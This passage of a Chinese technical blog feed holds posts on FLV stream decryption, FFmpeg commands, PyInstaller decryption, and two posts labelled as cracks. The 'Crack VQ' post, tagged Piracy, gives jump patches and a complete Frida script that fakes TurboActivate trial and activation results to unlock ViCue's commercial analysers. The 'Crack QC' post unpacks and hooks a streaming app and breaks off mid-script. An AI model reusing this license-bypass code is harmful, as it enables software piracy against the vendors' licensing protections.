rtmp&#x2F;FLV&#x2F;AES 等关键词，然后根据偏移 trace，最后找到其与 FLV 加解密相关的库是 <code>L.so</code>，其中实现了被称为 F1VAESC0dec 的伪编解码器来做加解密。</p><p><code>L.so</code> 中没有符号，分析起来比较困难，刚不动，账号还差点被封了，吓个半死。于是转过头分析 iOS 平台，发现反汇编代码中是有这部分加密的，只是没有提供接口和说明。</p><p>SDK 中是静态库，看起来太麻烦，我就自己编译了一个带符号的 Demo 分析了一下。下面直接看一下调用流程：</p><p>TODO：分析 + 流程图 + 代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次搞 FLV 视频的加密与解密到现在大概有一年了，当时遇到了实例 F，但是困扰了很久，断断续续地估计搞了大半个月才搞定了大部分，其实主要是看音视频相关内容，这期间也有了这篇文章的轮廓，最开始文章是概述性的，最近我又翻出来，制作了很多新图，修改了很多内容变成了现在这种讲解性的。第一次搞定之后还是非常有成就感的，不过也搁置了很长一段时间，之后陆陆续续又遇到了其他例子，本文的内容也逐渐多了点。</p><p>有时候感觉自己集中精力搞明白一件事情之后下次总想着捡现成的，结果很久之后发现其实从来都没搞明白过。音视频不必说自然是博大精深，常学常新，而逆向总给我一种好像搞明白一件事情的幻觉，可很多时候自己基础并不扎实，那就只是空中楼阁。</p><p>期间遇到了非常多问题，感谢网络各路音视频开发大佬，也感谢给我提供样本的哥们。</p>]]></content>
    
    
    <summary type="html">本文将着重分析 FLV 容器的语法语义，结合我遇到的几个安卓平台的 FLV 加密进行分析，同时对这几个样本做解密还原。</summary>
    
    
    
    <category term="AV" scheme="https://yzctzl.github.io/categories/AV/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="FFmpeg" scheme="https://yzctzl.github.io/tags/FFmpeg/"/>
    
    <category term="Live" scheme="https://yzctzl.github.io/tags/Live/"/>
    
    <category term="FLV" scheme="https://yzctzl.github.io/tags/FLV/"/>
    
  </entry>
  
  <entry>
    <title>FFmpeg 编解码基础</title>
    <link href="https://yzctzl.github.io/2022/FFmpeg/"/>
    <id>https://yzctzl.github.io/2022/FFmpeg/</id>
    <published>2022-10-31T16:00:00.000Z</published>
    <updated>2022-10-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><h3 id="HEVC"><a href="#HEVC" class="headerlink" title="HEVC"></a>HEVC</h3><h4 id="二压"><a href="#二压" class="headerlink" title="二压"></a>二压</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -y -i input -c:v libx265 -b:v 1300k -x265-params pass=1 -an -f null /dev/null &amp;&amp; \</span><br><span class="line">ffmpeg -i input -c:v libx265 -b:v 1300k -x265-params pass=2 -c:a aac -b:a 128k output.mp4</span><br></pre></td></tr></table></figure><h3 id="硬件加速"><a href="#硬件加速" class="headerlink" title="硬件加速"></a>硬件加速</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -h encoder=h264_nvenc </span><br><span class="line">ffmpeg -h encoder=hevc_nvenc </span><br><span class="line">ffmpeg -y -vsync 0 -hwaccel cuda -hwaccel_output_format cuda -i input.mp4 -c:a copy -c:v hevc_nvenc -b:v 1.3M output.mp4</span><br></pre></td></tr></table></figure><h2 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h2><h3 id="PCM"><a href="#PCM" class="headerlink" title="PCM"></a>PCM</h3><p>细节参考：<a href="https://trac.ffmpeg.org/wiki/audio%20types">https://trac.ffmpeg.org/wiki/audio%20types</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i 1.m4a -f s16le -c pcm_s16le 1.raw</span><br><span class="line">ffmpeg -i 1.m4a -map_metadata -1 -c copy 01.m4a <span class="comment"># 移除所有 TAG</span></span><br><span class="line">ffmpeg -f u16le -ar 44100 -ac 1 -i input.raw output.wav <span class="comment"># raw 转 wav</span></span><br></pre></td></tr></table></figure><h3 id="AAC-HE"><a href="#AAC-HE" class="headerlink" title="AAC-HE"></a>AAC-HE</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i input.wav -c:a libfdk_aac -profile:a aac_he -b:a 64k output.m4a</span><br><span class="line">ffmpeg -i input.wav -c:a libfdk_aac -profile:a aac_he_v2 -b:a 32k output.m4a</span><br></pre></td></tr></table></figure><h2 id="ffplay"><a href="#ffplay" class="headerlink" title="ffplay"></a>ffplay</h2><h3 id="播放器控制"><a href="#播放器控制" class="headerlink" title="播放器控制"></a>播放器控制</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>q, ESC</td><td>退出</td></tr><tr><td>f, 左键双击</td><td>全屏</td></tr><tr><td>p, SPC</td><td>暂停</td></tr><tr><td>m</td><td>静音</td></tr><tr><td>9, 0</td><td>分别为降低音量和提高音量</td></tr><tr><td>&#x2F;, *</td><td>分别为降低音量和提高音量</td></tr><tr><td>a, v, t, c</td><td>分别为循环切换 音频、视频、字幕、节目</td></tr><tr><td>w</td><td>循环切换过滤器或者显示模式</td></tr><tr><td>s</td><td>暂停在下一帧即逐帧播放</td></tr><tr><td>left&#x2F;right</td><td>向后&#x2F;向前移动 10s</td></tr><tr><td>down&#x2F;up</td><td>向后&#x2F;向前移动 1s</td></tr><tr><td>page down&#x2F;page up</td><td>播放下&#x2F;上 一节(chapter)</td></tr><tr><td>右键单击</td><td>将宽度视为 100%，从鼠标横坐标位置开始播放</td></tr></tbody></table><h3 id="RAW"><a href="#RAW" class="headerlink" title="RAW"></a>RAW</h3><p>播放 YUV 数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffplay -pixel_format yuv420p -video_size 320x240 -framerate 5 yuv420p_320x240.yuv</span><br></pre></td></tr></table></figure><p>播放 RGB 数据</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffplay -pixel_format rgb24 -video_size 320x240 -i rgb24_320x240.rgb</span><br><span class="line">ffplay -pixel_format rgb24 -video_size 320x240 -framerate 5 -i rgb24_320x240.rgb</span><br></pre></td></tr></table></figure><p>播放 PCM 数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffplay -ar 48000 -ac 2 -f f32le 48000_2_f32le.pcm</span><br><span class="line">　　-ar set audio sampling rate (in Hz) (from 0 to INT_MAX) (default 0)</span><br><span class="line">　　-ac set number of audio channels (from 0 to INT_MAX) (default 0)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">使用 FFmpeg 命令行编解码常用的参数。</summary>
    
    
    
    <category term="AV" scheme="https://yzctzl.github.io/categories/AV/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="FFmpeg" scheme="https://yzctzl.github.io/tags/FFmpeg/"/>
    
    <category term="Encode" scheme="https://yzctzl.github.io/tags/Encode/"/>
    
  </entry>
  
  <entry>
    <title>Python 加密与解密</title>
    <link href="https://yzctzl.github.io/2022/RePy/"/>
    <id>https://yzctzl.github.io/2022/RePy/</id>
    <published>2022-09-18T16:00:00.000Z</published>
    <updated>2022-09-18T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>PyInstaller 是 Python 中常用的打包工具，另一个常用的是 pyexe。</p><h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/extremecoders-re/pyinstxtractor"><img src="https://github-readme-stats.vercel.app/api/pin/?username=extremecoders-re&repo=pyinstxtractor&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=extremecoders-re&repo=pyinstxtractor&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><p>使用该项目可以非常方便的解包，但不能解密那些已经加密过的 PYZ 文件 </p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>参考：<br><a href="https://zondatw.github.io/2021/decompile_encrypted_pyinstaller_exe/">https://zondatw.github.io/2021/decompile_encrypted_pyinstaller_exe/</a><br><a href="https://gist.github.com/yzctzl/70c77a981649cb660a42f97dc9060ce6">https://gist.github.com/yzctzl/70c77a981649cb660a42f97dc9060ce6</a></p><ol><li>首先需要找到解包之后的 key.pyc 文件</li><li>如果该文件缺失 pyc 头，则补全</li><li>使用 pycdc&#x2F;uncompyle6 解密，找到 key</li><li>使用上述脚本解密</li></ol><h2 id="py-c"><a href="#py-c" class="headerlink" title="py-&gt;c"></a>py-&gt;c</h2><p>把 python 转为 C&#x2F;C++ 应该是比较快速的升级方法。<br>Try Nuitka, Shed Skin(experimental), Cython(uses type annotations for speed), or PyPy(uses restricted subset of Python called RPython).<br><a href="https://qr.ae/pvbnbL">ref</a></p><h2 id="Awesome-Python-RE"><a href="#Awesome-Python-RE" class="headerlink" title="Awesome Python RE"></a>Awesome Python RE</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Svenskithesource/awesome-python-re"><img src="https://github-readme-stats.vercel.app/api/pin/?username=Svenskithesource&repo=awesome-python-re&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=Svenskithesource&repo=awesome-python-re&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><h2 id="scz-Python-RE"><a href="#scz-Python-RE" class="headerlink" title="scz Python RE"></a>scz Python RE</h2><p><a href="http://scz.617.cn:8/python/index.html">http://scz.617.cn:8/python/index.html</a></p>]]></content>
    
    
    <summary type="html">网络上的一些 Python 相关加解密的研究</summary>
    
    
    
    <category term="Sec" scheme="https://yzctzl.github.io/categories/Sec/"/>
    
    
    <category term="TS" scheme="https://yzctzl.github.io/tags/TS/"/>
    
    <category term="Sec" scheme="https://yzctzl.github.io/tags/Sec/"/>
    
    <category term="Python" scheme="https://yzctzl.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Crack VQ</title>
    <link href="https://yzctzl.github.io/2022/VQ/"/>
    <id>https://yzctzl.github.io/2022/VQ/</id>
    <published>2022-09-07T16:00:00.000Z</published>
    <updated>2022-09-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>音视频的码流分析工具在做音视频编码的学习研究中一直是最强利器，目前该领域的专业软件包括：Elecard 和 ViCue，由于 Elecard 使用 HASP SL 导致破解异常困难，本文就从 ViCue 入手，分析与破解其两款产品。</p><p>ViCue 使用 LimeLM 来保护产品，这款防护工具网上已经有一些研究了，可以从 API 调用入手。</p><h2 id="VQP"><a href="#VQP" class="headerlink" title="VQP"></a>VQP</h2><p>经过 x64dbg 和 IDA Pro 联动调试，仅需要修改两个跳转即可完美跳过。</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>这里不能直接去掉调用，因为这会导致 License 缺失，无法正常使用；而是应该去掉 checkoutLicenseState() 相关的判定逻辑。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.1.03.png' data-fancybox='default' data-caption='应该去除的逻辑'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.1.03.png" class="lazyload" data-srcset="/img/2022/VQ/2.1.03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="应该去除的逻辑"></a><span class='image-caption'>应该去除的逻辑</span></div></div><p>这里是直接在 checkoutLicenseState() 调用之后判定其返回值，跳转到应用程序窗口创建逻辑：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.1.01.png' data-fancybox='default' data-caption='直接修改跳转'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.1.01.png" class="lazyload" data-srcset="/img/2022/VQ/2.1.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="直接修改跳转"></a><span class='image-caption'>直接修改跳转</span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.1.02.png' data-fancybox='default' data-caption='显示程序窗口'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.1.02.png" class="lazyload" data-srcset="/img/2022/VQ/2.1.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="显示程序窗口"></a><span class='image-caption'>显示程序窗口</span></div></div><h3 id="checkoutLicenseState"><a href="#checkoutLicenseState" class="headerlink" title="checkoutLicenseState"></a>checkoutLicenseState</h3><p>完成上述修改之后还不能正确识别 License，还需要修改 checkoutLicenseState() 中的 License 判定逻辑，通过分析，最后一段是 企业版 的逻辑：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.2.03.png' data-fancybox='default' data-caption='企业版'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.2.03.png" class="lazyload" data-srcset="/img/2022/VQ/2.2.03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="企业版"></a><span class='image-caption'>企业版</span></div></div><p>所以类似以上，修改一个跳转：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.2.01.png' data-fancybox='default' data-caption='函数头部就开始跳转'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.2.01.png" class="lazyload" data-srcset="/img/2022/VQ/2.2.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="函数头部就开始跳转"></a><span class='image-caption'>函数头部就开始跳转</span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/VQ/2.2.02.png' data-fancybox='default' data-caption='跳到函数尾部的逻辑'><img fancybox itemprop="contentUrl" src="/img/2022/VQ/2.2.02.png" class="lazyload" data-srcset="/img/2022/VQ/2.2.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="跳到函数尾部的逻辑"></a><span class='image-caption'>跳到函数尾部的逻辑</span></div></div><h2 id="VQA"><a href="#VQA" class="headerlink" title="VQA"></a>VQA</h2><p>VQA 的调用方式更加隐蔽，而且使用了混淆，使得直接修改调用，变得困难了。</p><p>因为可以无限制试用，那一种思路是：hook turoboactivate.dll 的返回值，绕过三天试用。</p><h3 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h3><p>使用 frida 完成这项工作更方便一些：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> TA_UseTrial = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&#x27;TurboActivate.dll&#x27;</span>, <span class="string">&#x27;TA_UseTrial&#x27;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(TA_UseTrial, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_UseTrial ARG: &quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">0x00000000</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_UseTrial RET: &quot;</span>, retval)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TA_TrialDaysRemaining = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&#x27;TurboActivate.dll&#x27;</span>, <span class="string">&#x27;TA_TrialDaysRemaining&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> TA_TrialDaysRemaining_arg2;</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(TA_TrialDaysRemaining, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        TA_TrialDaysRemaining_arg2 = args[<span class="number">2</span>]</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_TrialDaysRemaining ARG: &quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>].<span class="title function_">readInt</span>())</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">0x00000000</span>)</span><br><span class="line">        TA_TrialDaysRemaining_arg2.<span class="title function_">writeInt</span>(<span class="number">0x00010086</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_TrialDaysRemaining RET: &quot;</span>, retval, <span class="string">&quot;; args[2]: &quot;</span>, TA_TrialDaysRemaining_arg2.<span class="title function_">readInt</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TA_IsActivated = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&#x27;TurboActivate.dll&#x27;</span>, <span class="string">&#x27;TA_IsActivated&#x27;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(TA_IsActivated, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_IsActivated ARG: &quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>].<span class="title function_">readInt</span>())</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">0x00000000</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TA_IsActivated RET: &quot;</span>, retval)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>若要能够无感启动与关闭，可以使用 bat + vbs 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(F:\App\miniconda3\Scripts\activate.bat F:\App\miniconda3\) &amp;&amp; conda activate re &amp;&amp; frida ./VQAnalyzer.exe -l vqhook.js</span><br></pre></td></tr></table></figure><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> ws=WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">ws.Run <span class="string">&quot;start.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">记录 VQA/VQP 破解过程</summary>
    
    
    
    <category term="Piracy" scheme="https://yzctzl.github.io/categories/Piracy/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="Piracy" scheme="https://yzctzl.github.io/tags/Piracy/"/>
    
    <category term="x64dbg" scheme="https://yzctzl.github.io/tags/x64dbg/"/>
    
    <category term="firda" scheme="https://yzctzl.github.io/tags/firda/"/>
    
  </entry>
  
  <entry>
    <title>Crack QC</title>
    <link href="https://yzctzl.github.io/2022/QC3/"/>
    <id>https://yzctzl.github.io/2022/QC3/</id>
    <published>2022-05-30T16:00:00.000Z</published>
    <updated>2022-05-30T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/yzctzl/QC3"><img src="https://github-readme-stats.vercel.app/api/pin/?username=yzctzl&repo=QC3&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=yzctzl&repo=QC3&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><p>xdj 之后 QC 是当之无愧的行业领头羊，20 年仅有几十个套壳 App，21 年底就有 150+ 的套壳 app，到目前已经有 200+ 套壳，这些套壳都是使用 QC 的主播资源，然后上自家游戏和 df。</p><h2 id="误入歧途"><a href="#误入歧途" class="headerlink" title="误入歧途"></a>误入歧途</h2><p>最开始看到 libapp.so 和 libflutter.so 决定 hook BoringSSL 中的 handshake.cc 内的 ssl_verify_peer_cert 函数。但 hook 后并没有发现有效的数据包。</p><h2 id="easy-壳"><a href="#easy-壳" class="headerlink" title="easy 壳"></a>easy 壳</h2><p>既然 flutter 内部没有数据包，我找到群主交流了一下，一致推测很可能在 Java 层。另外注意到 libkiwi.so 这是阿里的游戏盾。</p><p>这里的 Java 层有一个很简单的壳，是使用三段式存储两个 dex 到一个文件中，结构如下：</p><ol><li>shell.dex: 壳本体，负责解密，得到两个 dex</li><li>两个 dex 的加密数据: 这一段直接拼接到了 shell.dex 的文件末尾，占的空间最大</li><li>index: 这里索引两个 dex 的文件名和尺寸</li></ol><p>虽然 shell.dex 经过了混淆，但很轻松就能够获取其中的解密逻辑。</p><h2 id="ByteString"><a href="#ByteString" class="headerlink" title="ByteString"></a>ByteString</h2><p>这里拿到两个 dex 之后像静态分析了一下，使用到了很多 flutter plugin，这可能就是请求逻辑在 Java 层的原因，通过 frida hook okio 成功获取到了数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;okio.ByteString&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BSString</span> = <span class="title class_">ByteString</span>.<span class="property">string</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.nio.charset.Charset&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="title class_">BSString</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> ret_value = <span class="variable language_">this</span>.<span class="title function_">string</span>(arg1)</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(ret_value)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(ret)</span><br><span class="line">            <span class="keyword">return</span>(ret_value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">FlutterYunCengKiwiPlugin</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.flutter_yun_ceng_kiwi.FlutterYunCengKiwiPlugin&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MethodCall</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;io.flutter.plugin.common.MethodCall&quot;</span>);</span><br><span class="line">        <span class="title class_">FlutterYunCengKiwiPlugin</span>[<span class="string">&quot;onMethodCall&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">methodCall, result</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title function_">onMethodCall</span>(methodCall, result);</span><br><span class="line">            <span class="keyword">let</span> mc = <span class="title class_">Java</span>.<span class="title function_">cast</span>(methodCall, <span class="title class_">MethodCall</span>);</span><br><span class="line">            <span class="keyword">if</span> (mc.<span class="property">method</span>.<span class="property">value</span> == <span class="string">&#x27;initEx&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> key = <span 